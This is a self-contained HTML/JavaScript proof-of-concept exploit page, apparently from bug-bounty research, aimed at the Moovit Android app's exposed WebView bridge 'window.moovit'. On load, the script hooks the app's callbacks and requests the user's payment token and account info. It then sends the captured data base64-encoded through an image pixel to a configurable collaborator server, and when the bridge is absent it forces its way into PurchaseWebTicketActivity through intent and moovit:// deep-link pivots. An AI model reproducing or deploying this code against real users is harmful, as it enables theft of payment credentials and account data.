<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Moovit Bridge Exploit</title>
    <style>
        body { background-color: #121212; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
        .box { border: 1px solid #333; padding: 15px; margin-bottom: 20px; border-radius: 5px; background: #1e1e1e; }
        h2 { color: #fff; border-bottom: 1px solid #555; padding-bottom: 10px; }
        button { background: #d32f2f; color: white; border: none; padding: 10px 20px; font-size: 16px; cursor: pointer; margin: 5px; }
        #logs { color: #ccc; font-size: 12px; white-space: pre-wrap; word-wrap: break-word; }
        .highlight { color: #ffff00; font-weight: bold; }
    </style>
</head>
<body>

    <div class="box">
        <h2>STATUS</h2>
        <div id="status">Analyzing Context...</div>
    </div>

    <div class="box">
        <h2>LOGS</h2>
        <div id="logs"></div>
    </div>

    <div class="box">
        <h3>Manual Controls</h3>
        <button onclick="launchIntent()">Force Intent Pivot</button>
        <button onclick="launchDeepLink()">Force Deep Link Pivot</button>
    </div>

    <script>
        // ==========================================
        // CONFIGURATION
        // ==========================================
        const EXFIL_SERVER = "https://your-collaborator-url.com"; // Replace with your Burp Collab/Server
        const MY_URL = "https://gelo.gg/pocs/moovit_poc.html";
        const TARGET_COMPONENT = "com.tranzmate/com.moovit.ticketing.purchase.web.PurchaseWebTicketActivity";

        // ==========================================
        // LOGGING HELPER
        // ==========================================
        function log(msg, isHighlight = false) {
            const el = document.getElementById("logs");
            const span = isHighlight ? `<span class="highlight">[!] ${msg}</span>` : `[+] ${msg}`;
            el.innerHTML += span + "<br>";
            console.log(msg);
        }

        function exfil(data) {
            // Attempt to send data out. Using Image pixel to avoid CORS issues if simple fetch fails.
            new Image().src = EXFIL_SERVER + "/?data=" + btoa(data);
        }

        // ==========================================
        // EXPLOIT LOGIC
        // ==========================================
        function runExploit() {
            document.getElementById("status").innerText = "VULNERABLE CONTEXT DETECTED";
            document.getElementById("status").style.color = "#00ff00";
            log("Interface 'window.moovit' found!", true);

            // 1. Hook the callbacks defined in the Java code
            // The Java code calls: window.onPaymentTokenResult(json)
            window.onPaymentTokenResult = function(jsonToken) {
                log("CAPTURED PAYMENT TOKEN: " + jsonToken, true);
                alert("PAYMENT TOKEN: " + jsonToken);
                exfil("TOKEN_" + jsonToken);
            };

            // The Java code calls: window.onRequestErrorResult(jsonError)
            // Sometimes account info returns here if the flow is weird
            window.onRequestErrorResult = function(errorJson) {
                log("CALLBACK RECEIVED: " + errorJson, true);
                alert("CALLBACK: " + errorJson);
                exfil("CALLBACK_" + errorJson);
            };

            // 2. Trigger the Java Methods
            log("Calling moovit.requestAccountInfo()...");
            try {
                window.moovit.requestAccountInfo();
            } catch(e) { log("Error calling account info: " + e); }

            log("Calling moovit.requestPaymentToken()...");
            try {
                // We send a dummy JSON to trigger the flow
                var dummyPayment = JSON.stringify({
                    "amount": "0.00",
                    "currency": "USD",
                    "dummy_payload": "true"
                });
                window.moovit.requestPaymentToken(dummyPayment);
            } catch(e) { log("Error calling payment token: " + e); }
        }

        // ==========================================
        // PIVOT LOGIC (Intent Launch)
        // ==========================================
        function launchIntent() {
            log("Attempting to launch PurchaseWebTicketActivity via Intent...");
            // We pass S.url (String) and S.link (String) to try and satisfy the Activity's extra requirements
            const intent = "intent:#Intent;" + 
                           "component=" + TARGET_COMPONENT + ";" + 
                           "S.url=" + MY_URL + ";" + 
                           "S.link=" + MY_URL + ";" + 
                           "end";
            window.location.href = intent;
        }

        function launchDeepLink() {
            log("Attempting to launch via moovit:// scheme...");
            // Fallback if the raw intent crashes the app
            window.location.href = "moovit://ticketing/purchase?url=" + MY_URL;
        }

        // ==========================================
        // MAIN EXECUTION
        // ==========================================
        window.onload = function() {
            if (window.moovit) {
                // We are in the correct Activity
                runExploit();
            } else {
                // We are in the wrong Activity (Safe Zone)
                document.getElementById("status").innerText = "SAFE CONTEXT - PIVOTING...";
                document.getElementById("status").style.color = "orange";
                log("Interface not found. Launching pivot in 2 seconds...");
                
                // Auto-pivot after short delay
                setTimeout(launchIntent, 2000);
            }
        };
    </script>
</body>
</html>
